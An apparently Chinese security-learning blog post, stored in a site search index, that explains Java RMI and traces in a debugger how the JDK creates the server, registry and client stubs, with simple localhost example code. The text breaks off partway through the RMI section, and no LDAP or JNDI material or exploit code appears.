<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>java安全-RMI&amp;LDAP&amp;JNDI原理分析学习</title>
      <link href="/posts/ad3be040.html"/>
      <url>/posts/ad3be040.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>学习三个协议的源码分析，源码基础实现和漏洞分析学习写了很大篇幅，高版本绕过没写进去，费了挺长时间。</p><h1 id="0x01、RMI"><a href="#0x01、RMI" class="headerlink" title="0x01、RMI"></a>0x01、RMI</h1><h2 id="一、RMI描述"><a href="#一、RMI描述" class="headerlink" title="一、RMI描述"></a>一、RMI描述</h2><p>RMI（远程方法调用），java的一种用于实现远程过程调用的应用程序接口，采用分布式应用程序思想。</p><p>主要构成：<br><strong>Client(客户端)</strong> ：通过向注册中心获取服务端信息进而远程调用服务器。</p><ul><li>存根（skeleton）&#x2F;桩(Stub)：远程对象在客户端上的代理。</li><li>远程引用层(Remote Reference Layer):解析并执行远程引用协议</li><li>传输层(Transport):发送调用、传递远程方法参数、接收远程方法执行结果。</li></ul><p><strong>Server(服务端)</strong> ：开启远程调用的服务器。</p><ul><li>骨架(Skeleton):读取客户端传递的方法参数，调用服务器方的实际对象方法， 并接收方法执行后的返回值。</li><li>远程引用层(Remote Reference Layer):处理远程引用后向骨架发送远程方法调用。</li><li>传输层(Transport):监听客户端的入站连接，接收并转发调用到远程引用层。</li></ul><p><strong>Registry(注册中心)</strong> ：以URL形式注册远程对象，并向客户端回复对远程对象的引用。</p><p>引用官方的图：</p><p><img src="/posts/ad3be040/r-1.png" title="rmi"></p><p>其中实现远程方法的类必须实现Remote接口，并且该类必须继承UnicastRemoteObject类。<br>或者可以不继承UnicastRemoteObject类，调用UnicastRemoteObject.exportObject()手工进行初始化。</p><p><img src="/posts/ad3be040/r-2.png" title="不继承实现"></p><p>注：客户端和服务端的接口需要相同的包名才能序列化反序列化</p><h2 id="二、RMI简单实现"><a href="#二、RMI简单实现" class="headerlink" title="二、RMI简单实现"></a>二、RMI简单实现</h2><p>简述实现过程:<br>服务器端（Server）：</p><ul><li>先创建实现Remote的接口</li><li>实现远程调用服务对象类</li><li>创建服务端类，对实现Remote的接口对象生成远程调用服务类，通过注册中心绑定该调用对象。</li></ul><p>客户端（Client）:</p><ul><li>先创建实现Remote的接口</li><li>通过注册中心获取远程调用服务端口，将服务名绑定给接口对象</li><li>接口对象调用远程服务端程序执行方法。</li></ul><h3 id="1、服务端"><a href="#1、服务端" class="headerlink" title="1、服务端"></a>1、服务端</h3><p>实现Remote的对象接口：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIObject</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String hello)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be040/r-3.png" title="实现Remote的对象接口"></p><p>实现调用服务类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIObjectImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RMIObject</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RMIObjectImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException&#123;</span><br><span class="line">        <span class="comment">//UnicastRemoteObject.exportObject(this,0);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String hello)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;远程调用输出：&quot;</span>+hello);</span><br><span class="line">        <span class="keyword">return</span> hello;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be040/r-4.png" title="实现调用服务类"></p><p>开启服务端:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] agrs)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="comment">//创建远程调用对象，这一步已经开启远程调用服务了</span></span><br><span class="line">        RMIObject rmo=<span class="keyword">new</span> <span class="title class_">RMIObjectImpl</span>();</span><br><span class="line">        <span class="comment">//创建注册中心绑定调用端口</span></span><br><span class="line">        Registry rg= LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">//注册绑定调用服务</span></span><br><span class="line">        rg.bind(<span class="string">&quot;RMIObject&quot;</span>,rmo);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be040/r-7.png" title="开启服务端"></p><h3 id="2、客户端"><a href="#2、客户端" class="headerlink" title="2、客户端"></a>2、客户端</h3><p>实现Remote的对象接口：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIObject</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String hello)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be040/r-8.png" title="实现Remote的对象接口"></p><p>客户端进行远程调用：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException &#123;</span><br><span class="line">        Registry rg= LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        RMIObject rc=(RMIObject) rg.lookup(<span class="string">&quot;RMIObject&quot;</span>);</span><br><span class="line">        rc.hello(<span class="string">&quot;hey&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be040/r-9.png" title="客户端"></p><h3 id="3、实现"><a href="#3、实现" class="headerlink" title="3、实现"></a>3、实现</h3><p>客户端执行远程调用</p><p><img src="/posts/ad3be040/r-5.png" title="客户端远程调用"></p><p>服务端被调用执行</p><p><img src="/posts/ad3be040/r-6.png" title="服务端被调用"></p><h2 id="三、底层调试分析"><a href="#三、底层调试分析" class="headerlink" title="三、底层调试分析"></a>三、底层调试分析</h2><p>涉及相关知识点描述：</p><ul><li>TCPEndpoint：TCP端点，实现通讯的一个接口</li><li>ObjID：标识RMI运行时的远程对象，所有服务通过ObjID来调用</li><li>liveRef：将ObjID和TCPEndpoint进行封装起来连接使用</li><li>Target：封装远程对象的信息包括上述的信息</li></ul><h3 id="1、服务端创建"><a href="#1、服务端创建" class="headerlink" title="1、服务端创建"></a>1、服务端创建</h3><p>创建远程服务断点</p><p><img src="/posts/ad3be040/r-10.png" title="远程服务调试"></p><p>跟进远程调用类</p><p><img src="/posts/ad3be040/r-11.png" title="远程服务调试"></p><p>调用到父类<code>UnicastRemoteObject</code>的构造函数，端口为0（表示未设定端口，默认传入0，即后续会随机生成端口），继续跟进</p><p><img src="/posts/ad3be040/r-12.png" title="远程服务调试"></p><p>通过<code>exportObject</code>导出远程对象，将远程调用类和端口传入，继续跟进</p><p>此时通过<code>UnicastServerRef</code>处理端口信息，处理完后再次调用<code>exportObject</code>导出远程对象</p><p><img src="/posts/ad3be040/r-13.png" title="远程服务调试"></p><p>跟进<code>UnicastServerRef</code>方法，方法调用<code>LiveRef</code>类去处理port</p><p><img src="/posts/ad3be040/r-14.png" title="UnicastServerRef"></p><p>跟进<code>LiveRef</code>构造方法,通过<code>new objID()</code>生成一个对象id,然后调用带<code>LiveRef</code>类的参构造方法</p><p><img src="/posts/ad3be040/r-15.png" title="LiveRef"></p><p>继续跟进带参构造方法</p><p><img src="/posts/ad3be040/r-16.png" title="带参LiveRef"></p><p>通过调用<code>TCPEndpoint.getLocalEndpoint(port)</code>方法对端口进行处理</p><p><img src="/posts/ad3be040/r-17.png" title="TCPEndpoint.getLocalEndpoint"></p><p>跟进<code>getLocalEndpoint</code>方法，该方法经过TCP的相关属性建立，获取在本地地址中的TCP通信结点，端口为传进去的0，地址为本地ip地址。最后返回<code>TCPEndpoint</code>对象。</p><p><img src="/posts/ad3be040/r-18.png" title="TCPEndpoint.getLocalEndpoint"></p><p>再通过Liveref构造方法，将ep、id、islocal属性赋值。</p><p><img src="/posts/ad3be040/r-19.png" title="liveref"></p><p>创建了<code>liveref</code>过后，再将<code>liveref</code>传入<code>UnicastServerRef</code>的父类构造函数创建远程服务引用当中</p><p><img src="/posts/ad3be040/r-20.png" title="UnicastServerRef"></p><p>调用父类的构造函数，将<code>livefref</code>赋值给<code>ref</code>变量，可以看到<code>liveref</code>主要就是TCP连接的核心封装。</p><p><img src="/posts/ad3be040/r-21.png" title="ref"></p><p>获取了<code>ref</code>过后，再对<code>obj</code>对象（此时为服务端的远程调用对象）和<code>ref</code>进行<code>exportObject</code>导出对象操作</p><p><img src="/posts/ad3be040/r-22.png" title="exportObject"></p><p>过程中会判断<code>obj</code>对象是否属于<code>UnicastRemoteObject</code>类，属于则将<code>sref</code>赋值给<code>ref</code>，表示此时的<code>ref</code>为服务端的TCP结点信息，然后再调用<code>sref</code>的<code>exportObject</code>导出对象操作</p><p><img src="/posts/ad3be040/r-24.png" title="sref.exportObject"></p><p>进入<code>UnicastServerRef</code>的导出操作中，通过反射获取到远程调用类，再创建<code>stub</code>存根（服务端创建<code>stub</code>存根，发送给注册中心，客户端从注册中心拿到<code>stub</code>存根，使用stub存根跟远程服务器进行通信），并对<code>stub</code>创建动态代理，代理<code>handler</code>处理还是由<code>liveref</code>处理请求。</p><p><img src="/posts/ad3be040/r-23.png" title="stub"></p><p>最后将上面的信息通过<code>target</code>方法进行整合到一个对象上来，存放了<code>stub</code>、<code>impl远程服务对象</code>、<code>UnicastServerRef</code>等信息。</p><p><img src="/posts/ad3be040/r-25.png" title="target"><br><img src="/posts/ad3be040/r-26.png" title="target"></p><p>其中<code>UnicastServerRef</code>的通信对象和<code>stub</code>的通信对象为同一个<code>liveref</code>，表示引用同一个网络通信</p><p><img src="/posts/ad3be040/r-27.png" title="target"></p><p>创建好<code>target</code>后，最后再将<code>target</code>通过<code>exportObj</code>方法导出来</p><p><img src="/posts/ad3be040/r-28.png" title="target"></p><p>即调用<code>liveref</code>的<code>exportObj</code>，其中的<code>ep</code>为<code>TCPEndpoint</code>，再调用<code>TCPEndpoint.exportObj()</code></p><p><img src="/posts/ad3be040/r-29.png" title="exportObject"></p><p>再接着调用<code>TCPTransport.exportObj()</code></p><p><img src="/posts/ad3be040/r-30.png" title="exportObject"></p><p>通过<code>listen()</code>方法开启监听，开启网络socket通信</p><p><img src="/posts/ad3be040/r-31.png" title="listen"><br><img src="/posts/ad3be040/r-32.png" title="listen"></p><p>创建socket中，其中回对<code>listenport</code>监听端口进行判断，如果为0，则调用<code>server.getLocalPort()</code>方法</p><p><img src="/posts/ad3be040/r-33.png" title="listenport"></p><p>跟进<code>server.getLocalPort()</code>方法，调用<code>getImpl().getLocalPort()</code>，<code>getImpl()</code>获取<code>impl</code>对象（即图中的<code>DualStackPlainSocketlmpl</code>对象），然后再调用<code>getLocalPort()</code>获取<code>localport</code></p><p><img src="/posts/ad3be040/r-36.png" title="server.getLocalPort()"></p><p>此时的<code>impl</code>对象（<code>DualStackPlainSocketlmpl</code>）中已经存在<code>localport</code>，表明在此步骤前就已经生成了该<code>impl</code>对象的随机<code>localport</code>。</p><p><img src="/posts/ad3be040/r-37.png" title="localport"></p><p>往前追溯，发现<code>impl</code>对象的<code>localport</code>在<code>createServerSocket</code>创建服务<code>socket server</code>的时候生成的，接着跟，下面的图都是调用情况，直接跟进</p><p><img src="/posts/ad3be040/r-38.png" title="createServerSocket"><br><img src="/posts/ad3be040/r-39.png" title="createServerSocket"><br><img src="/posts/ad3be040/r-40.png" title="createServerSocket"><br><img src="/posts/ad3be040/r-44.png" title="ServerSocket"><br><img src="/posts/ad3be040/r-45.png" title="bind"><br><img src="/posts/ad3be040/r-46.png" title="bind"></p><p>一直到<code>PlainSocketlmpl.bind</code>方法，此时<code>impl</code>为<code>DualStackPlainSocketlmpl</code>对象，当前<code>localport</code>还没有赋值</p><p><img src="/posts/ad3be040/r-41.png" title="PlainSocketlmpl.bind"></p><p>继续跟进，到<code>AbstractPlainSocketlmpl.bind</code>方法，再跟进<code>socketBind</code>方法</p><p><img src="/posts/ad3be040/r-42.png" title="AbstractPlainSocketlmpl.bind"></p><p>在<code>socketBind</code>方法中通过<code>localPort0</code>方法生成的随机<code>localport</code>值</p><p><img src="/posts/ad3be040/r-43.png" title="localPort0"></p><p>回到主体来，判断<code>listenport</code>是否等于0，等于就将生成的随机<code>localport</code>赋值给监听端口，开启新线程等待连接后至此服务端已经将远程调用服务端口发布了出来</p><p><img src="/posts/ad3be040/r-33.png" title="listenport"></p><p>网络连接开始监听，开启新线程等待连接后至此服务端已经将远程调用服务端口发布了出来</p><p>最后调用父类<code>exportObj</code>方法将<code>target</code>发布</p><p><img src="/posts/ad3be040/r-47.png" title="exportObj"></p><p>这里的作用主要是讲发布的<code>target</code>对象相关数据（ref、stub、impl等信息）存放在<code>hashtable</code>中</p><p><img src="/posts/ad3be040/r-48.png" title="putTarget"><br><img src="/posts/ad3be040/r-49.png" title="put"></p><p>最后完成整个发布过程，开启监听等待连接。</p><p>引用一张su18大佬的服务器远程调用执行图</p><p><img src="/posts/ad3be040/r-50.png" title="执行图"></p><h3 id="2、注册中心创建"><a href="#2、注册中心创建" class="headerlink" title="2、注册中心创建"></a>2、注册中心创建</h3><p>注册中心绑定对象方法：bind、unbind、rebind<br>查询对象的方法：lookup、list</p><hr><p>在注册中心创建处下断点</p><p><img src="/posts/ad3be040/r-51.png" title="注册中心"></p><p>创建代理方法中返回的<code>new RegistryImpl</code>对象，将绑定端口传入</p><p><img src="/posts/ad3be040/r-52.png" title="new RegistryImpl"></p><p>跟进<code>RegistryImpl</code></p><p>先是判断注册端口是不是默认的1099和安全管理器（<code>System.getSecurityManager()</code>）是否开启，当前默认没有开启，因此会进入else代码段中</p><p><img src="/posts/ad3be040/r-53.png" title="RegistryImpl"></p><p>同服务器端创建一样，也创建了<code>liveRef</code>对象<code>lref</code>，端口为1099</p><p><img src="/posts/ad3be040/r-54.png" title="liveRef"><br><img src="/posts/ad3be040/r-55.png" title="liveRef"></p><p>然后通过<code>setup</code>方法将<code>lref</code>放入<code>UnicastServerRef</code>对象中然后传进<code>setup</code>方法中，当前环境的java版本（java-1.8.0_332）还将<code>RegistryImpl</code>对象进行注册表过滤</p><p><img src="/posts/ad3be040/r-56.png" title="liveRef"></p><p>调用父类构造方法也是将<code>liveRef</code>传给<code>Ref</code></p><p><img src="/posts/ad3be040/r-57.png" title="liveRef"></p><p>返回后，进入<code>setup</code>方法，作用效果跟服务器端创建差不多，也对<code>ref</code>进行导出，只不过加了个<code>permanent</code>表示永久性，服务器端创建的为临时性。</p><p><img src="/posts/ad3be040/r-58.png" title="setup"></p><p>导出方法相同，对<code>RegistryImpl</code>对象创建动态代理<code>stub</code>，不同的是创建代理中，由于<code>RegistryImpl</code>对象在jdk内置中存在<code>RegistryImpl_stub</code>，因此判断当前对象后缀_stub是否存在时，会返回true表示存在，进行判断体</p><p><img src="/posts/ad3be040/r-59.png" title="createProxy"><br><img src="/posts/ad3be040/r-70.png" title="bind"><br><img src="/posts/ad3be040/r-60.png" title="RegistryImpl_stub"></p><p>进入<code>createStub</code>方法，将<code>RegistryImpl</code>对象和<code>ref</code>传入，方法比较容易理解，将<code>ref</code>传入<code>RegistryImpl_stub</code>对象并且实例化</p><p><img src="/posts/ad3be040/r-61.png" title="RegistryImpl_stub"></p><p><code>RegistryImpl_stub</code>对象的存根<code>stub</code>就创建好了</p><p><img src="/posts/ad3be040/r-62.png" title="stub"></p><p>由于<code>RegistryImpl_stub</code>类是<code>RemoteStub</code>类的子类，因此会进入<code>setSkeleton</code>方法，传参为<code>RegistryImpl</code>对象</p><p><img src="/posts/ad3be040/r-63.png" title="RegistryImpl"></p><p>传入<code>RegistryImpl</code>调用<code>createSkeleton</code>方法，跟进</p><p>跟<code>stub</code>创建一样，都是反射调用自带对应后缀的方法，然后实例化<code>RegistryImpl_Skel</code></p><p><img src="/posts/ad3be040/r-64.png" title="RegistryImpl"></p><p>创建完后，将上面的所有信息依旧是放入<code>target</code>中，然后将<code>target</code>进行<code>exportObj</code>导出</p><p><img src="/posts/ad3be040/r-65.png" title="RegistryImpl"></p><p>经过同样步骤监听后面再将信息存入到<code>table</code>表中，步骤同服务器端创建一样</p><p><img src="/posts/ad3be040/r-66.png" title="put"><br><img src="/posts/ad3be040/r-67.png" title="table"></p><p>到此注册中心创建完成</p><p>再查看绑定过程</p><p><img src="/posts/ad3be040/r-68.png" title="bind"></p><p>绑定过程比较简单，将<code>obj</code>对象和绑定名称放入<code>bindings</code>的<code>hashtable</code>表中进行存储</p><p><img src="/posts/ad3be040/r-69.png" title="bind"></p><p>到这里，注册中心的创建和绑定就完成</p><h3 id="3、客户端调用注册中心"><a href="#3、客户端调用注册中心" class="headerlink" title="3、客户端调用注册中心"></a>3、客户端调用注册中心</h3><p>连接注册中心下断点</p><p><img src="/posts/ad3be040/r-71.png" title="连接注册中心"></p><p>跟进<code>getRegistry</code>函数</p><p><img src="/posts/ad3be040/r-72.png" title="连接注册中心"></p><p>在客户端本地生成了<code>liveRef</code>，将<code>ObjID</code>和<code>TCPEndpoint</code>进行封装，<code>host</code>、<code>port</code>为输入指定的</p><p><img src="/posts/ad3be040/r-73.png" title="liveRef"></p><p>然后将<code>liveRef</code>传入<code>UnicastRef</code>方法中，最后传递给<code>ref</code>对象，相当于再进行了一层封装</p><p>返回中调用<code>createProxy</code>创建注册代理，跟进<code>createProxy</code></p><p><img src="/posts/ad3be040/r-74.png" title="createProxy"></p><p>这里跟注册中心创建<code>stub</code>的步骤一样，通过反射调用实例化<code>RegistryImpl_Stub</code>创建的<code>stub</code></p><p><img src="/posts/ad3be040/r-75.png" title="RegistryImpl_Stub"></p><p>到这<code>Registry</code>对象获取完成，接下来就是在注册中心<code>lookup</code>查找远程对象名</p><p><img src="/posts/ad3be040/r-76.png" title="lookup"></p><p>跟进<code>lookup</code>方法，先是通过<code>newCall</code>方法对代理<code>stub</code>获取远程连接，然后对远程连接流写入，写入对象为传进来的远程对象名称（目的是通过序列化传给注册中心我要查找的远程对象名是什么，注册中心再通过反序列化读取客户端传过来的数据）</p><p><img src="/posts/ad3be040/r-77.png" title="序列化写入"></p><p>写入过后，对<code>call</code>对象执行<code>invoke</code>方法操作，跟进</p><p><img src="/posts/ad3be040/r-78.png" title="invoke"></p><p>调用<code>call.executeCall()</code>方法，<code>executeCall</code>方法客户端对远程调用通信处理的核心，对获取的数据进行读取，包括读取远程对象的<code>liveRef</code>的<code>ObjID</code></p><p><img src="/posts/ad3be040/r-79.png" title="invoke"><br><img src="/posts/ad3be040/r-80.png" title="executeCall"></p><p>再将<code>call</code>通信中获取到的数据进行反序列化读取</p><p><img src="/posts/ad3be040/r-81.png" title="readObject"></p><p>读取后就获取到远程对象的动态代理<code>stub</code>信息了（ObjID、port、liveref等等）</p><p><img src="/posts/ad3be040/r-82.png" title="readObject"></p><p>完成获取后，就能直接跟服务器端远程通信了</p><h3 id="4、注册中心处理客户端调用"><a href="#4、注册中心处理客户端调用" class="headerlink" title="4、注册中心处理客户端调用"></a>4、注册中心处理客户端调用</h3><p>第三部分学习分析的客户端角度的调用，接着看注册中心对客户端的处理，这里重点在连接监听开启后创建的线程中的TCPTransport.run方法，run方法调用run0方法，run0方法调用核心信息读取handleMessages方法</p><p>直接从监听中线程开启运行<code>run</code>方法中分析学习</p><p><img src="/posts/ad3be040/r-105.png" title="run"></p><p><code>run</code>方法调用<code>run0</code>方法</p><p><img src="/posts/ad3be040/r-106.png" title="run0"></p><p>run0调用主要的读取信息的方法<code>handleMessages</code></p><p><img src="/posts/ad3be040/r-107.png" title="handleMessages"></p><p>在<code>handleMessages</code>方法中下断点，然后在客户端进行请求，服务器端注册中心会抓到断点信息，这里获取到<code>connection</code>连接信息，获取TCP连接读取流，然后传递给<code>op</code>对象</p><p><img src="/posts/ad3be040/r-108.png" title="handleMessages"></p><p>根据<code>op</code>值选择条件分支，对<code>conn</code>连接信息创建远程调用对象<code>call</code>，再调用<code>serviceCall</code>方法</p><p><img src="/posts/ad3be040/r-109.png" title="serviceCall"></p><p>通过<code>id</code>和<code>transport</code>，在<code>target</code>表中获取到远程对象（客户端）的<code>target</code>信息</p><p><img src="/posts/ad3be040/r-110.png" title="target"></p><p>从远程<code>target</code>对象获取他的<code>disp(UnicastServerRef)</code>后，对其调用<code>dispatch</code>方法</p><p><img src="/posts/ad3be040/r-111.png" title="dispatch"></p><p>进入<code>dispatch</code>方法后，先是获取读取流，然后判断<code>skel</code>是否存在（用来判断是服务端还是注册中心，注册中心存在<code>skel</code>）</p><p><img src="/posts/ad3be040/r-112.png" title="dispatch"></p><p>由于是注册中心，因此对进入调用<code>oldDispatch</code>方法（由于java版本不同，方法名和代码会有差别，但大体差不多，除了加的一些防御方法），继续跟进<code>oldDispatch</code>方法</p><p>在该方法最后，调用<code>skel.dispatch</code>方法</p><p><img src="/posts/ad3be040/r-113.png" title="skel.dispatch"></p><p>核心处理就在<code>skel.dispatch</code>方法当中，对不同的端进行不同的处理</p><p><img src="/posts/ad3be040/r-114.png" title="skel.dispatch"></p><ul><li>0表示调用的bind方法</li><li>1表示调用的list方法</li><li>2表示调用的lookup方法</li><li>3表示调用rebind方法</li><li>4表示调用unrebind方法</li></ul><p>由于是客户端发起的，通过<code>lookup</code>调用查询远程对象名，因此会进入2分支</p><p><img src="/posts/ad3be040/r-115.png" title="lookup分支"></p><p>相关流程注释出来了（低版本则是直接<code>readObject</code>反序列化对象，这里只是反序列化字符串）</p><p><img src="/posts/ad3be040/r-116.png" title="lookup分支"></p><p>可以看到<code>result</code>已经获取到远程调用对象的liveref<br><code>result</code>从<code>lookup</code>方法中获取，<code>impl</code>的<code>lookup</code>方法也是从<code>bindings</code>的<code>hashtable</code>中获取远程对象名，返回给<code>result</code></p><p><img src="/posts/ad3be040/r-118.png" title="result"><br><img src="/posts/ad3be040/r-117.png" title="序列化写入"></p><p>注册器处理客户端的大体的流程就到这完成</p><h3 id="5、注册中心处理服务端调用"><a href="#5、注册中心处理服务端调用" class="headerlink" title="5、注册中心处理服务端调用"></a>5、注册中心处理服务端调用</h3><p>这里注册中心处理方法大体跟步骤4处理客户端的相同,不重复分析了，只是最后走进的分支不同，<code>bind</code>走进0分支</p><p>注:不同的是这实现的步骤是基于服务端和注册端不在一起的情况下，在一起的情况下，服务端<code>bind</code>直接就对注册中心的<code>bind</code>的<code>hashtable</code>进行<code>put</code>了</p><p><img src="/posts/ad3be040/r-119.png" title="bind"></p><h3 id="6、客户端调用远程服务器方法"><a href="#6、客户端调用远程服务器方法" class="headerlink" title="6、客户端调用远程服务器方法"></a>6、客户端调用远程服务器方法</h3><p>调用处下断点</p><p><img src="/posts/ad3be040/r-83.png" title="远程方法调用断点"></p><p>跟进会进入到<code>invoke</code>方法（在分析cc1-Lazymap链的时候提到，动态代理对象在调用方法的时候会先进入到动态代理类的<code>invoke</code>方法中，可起到拦截过滤的作用），因为当前对象<code>RMIObject</code>是一个动态代理对象，因此跟进会先进入对应代理类的<code>Invoke</code>方法中</p><p><img src="/posts/ad3be040/r-85.png" title="远程代理类"></p><p>跟进<code>invoke</code>方法，前面对代理类和方法归属类做一些判断，然后调用<code>invokeRemoteMethod</code>方法，参数为代理、方法名、参数</p><p><img src="/posts/ad3be040/r-84.png" title="invoke"></p><p>继续跟进<code>invokeRemoteMethod</code>方法，前面判断代理是否实现<code>Remote</code>远程类，再判断<code>Method</code>的归属类是否是<code>Remote</code>的子类，不满足的话会抛出异常，满足会进入<code>UnicastRef.invoke</code>方法</p><p><img src="/posts/ad3be040/r-86.png" title="invokeRemoteMethod"></p><p>跟进<code>UnicastRef.invoke</code>方法，先是创建<code>liveref</code>的连接<code>connection</code></p><p><img src="/posts/ad3be040/r-87.png" title="连接创建"></p><p>再创建连接<code>connection</code>的远程连接流<code>call</code></p><p><img src="/posts/ad3be040/r-88.png" title="call创建"></p><p>接下来对参数列表进行判断后序列化写入</p><p><img src="/posts/ad3be040/r-89.png" title="参数序列化写入"><br><img src="/posts/ad3be040/r-90.png" title="参数序列化写入"></p><p>上面完成后，对<code>call</code>流进行执行操作</p><p><img src="/posts/ad3be040/r-91.png" title="executeCall"></p><p>其中<code>releaseOutputStream</code>方法是向对服务器远程调用序列化传输数据</p><p><img src="/posts/ad3be040/r-92.png" title="releaseOutputStream"></p><p>跟进，<code>out</code>为写入流且存在，因此会调用<code>flush()</code>方法</p><p><img src="/posts/ad3be040/r-93.png" title="flush"></p><p>跟进<code>flush</code>方法，会再次调用<code>flush</code>方法</p><p><img src="/posts/ad3be040/r-94.png" title="flush"></p><p>其中<code>drain</code>方法由于<code>pos</code>为0，因此会直接返回</p><p><img src="/posts/ad3be040/r-95.png" title="drain"><br><img src="/posts/ad3be040/r-96.png" title="drain"></p><p>进入到<code>BufferedOutputStream.flush()</code>方法中</p><p><img src="/posts/ad3be040/r-97.png" title="BufferedOutputStream.flush()"><br><img src="/posts/ad3be040/r-98.png" title="BufferedOutputStream.flush()"></p><p>继续跟进<code>flushBuffer()</code>方法，在该方法中，对数据进行序列化写入</p><p><img src="/posts/ad3be040/r-99.png" title="write"></p><p>同时，服务器端进行反序列化解析数据读取客户端传过来的数据，并执行方法</p><p><img src="/posts/ad3be040/r-100.png" title="服务器端执行方法"></p><p>执行后，客户端对写入流进行释放，写入执行过程就差不多结束</p><p>由于调用方法的返回类型为<code>String</code>返回的字符串，因此会进行反序列化读取返回来的字符串的操作</p><p><img src="/posts/ad3be040/r-101.png" title="反序列化读取"></p><p>获取<code>call</code>的读取流，然后通过<code>unmarshalValue</code>方法根据返回类型进行反序列化读取数据（这里会涉及到服务器返回恶意序列化数据然后客户端本地反序列化读取导致被攻击）</p><p><img src="/posts/ad3be040/r-102.png" title="unmarshalValue"><br><img src="/posts/ad3be040/r-103.png" title="unmarshalValue"></p><p>反序列化获取数据后，最后释放掉连接，然后返回获取的字符串</p><p><img src="/posts/ad3be040/r-104.png" title="unmarshalValue"></p><p>至此主要执行过程结束</p><h3 id="7、服务端处理客户端远程调用"><a href="#7、服务端处理客户端远程调用" class="headerlink" title="7、服务端处理客户端远程调用"></a>7、服务端处理客户端远程调用</h3><p>这里的起始分析位置跟步骤四相同，都是通过开启监听后，创建线程连接调用的<code>TCPTransport.run</code>方法引入的，直接通过（方法调用情况：<code>TCPTransport.run-&gt;run0-&gt;handleMessages-&gt;serviceCall-&gt;disp.dispatch-&gt;UnicastServerRef.dispatch</code>）到重点部分</p><p>步骤4中提到<code>skel</code>是否为<code>null</code>是判断是服务端处理还是注册器端处理，注册器端处理过后返回给客户端后，客户端直接跟服务端进行通信，序列化数据传输过来后，服务端开始处理，此时服务端并没有<code>skel</code>，因此会跳过该判断</p><p><img src="/posts/ad3be040/r-120.png" title="dispatch"></p><p>然后从读取流中读取方法名</p><p><img src="/posts/ad3be040/r-121.png" title="method"></p><p>获取到方法名后，通过<code>unmarshalParameters</code>方法将参数进行反序列化读取出来，前面分析过该方法了，就不分析了</p><p><img src="/posts/ad3be040/r-123.png" title="反序列化参数"><br><img src="/posts/ad3be040/r-122.png" title="反序列化参数"></p><p>读取过后，释放掉读取流，然后通过反射执行方法，得到方法的返回值</p><p><img src="/posts/ad3be040/r-124.png" title="反射执行方法"><br><img src="/posts/ad3be040/r-125.png" title="反射执行方法"></p><p>最后再将返回值通过<code>marshalValue</code>方法序列化写入传递给客户端</p><p><img src="/posts/ad3be040/r-126.png" title="序列化写入"><br><img src="/posts/ad3be040/r-127.png" 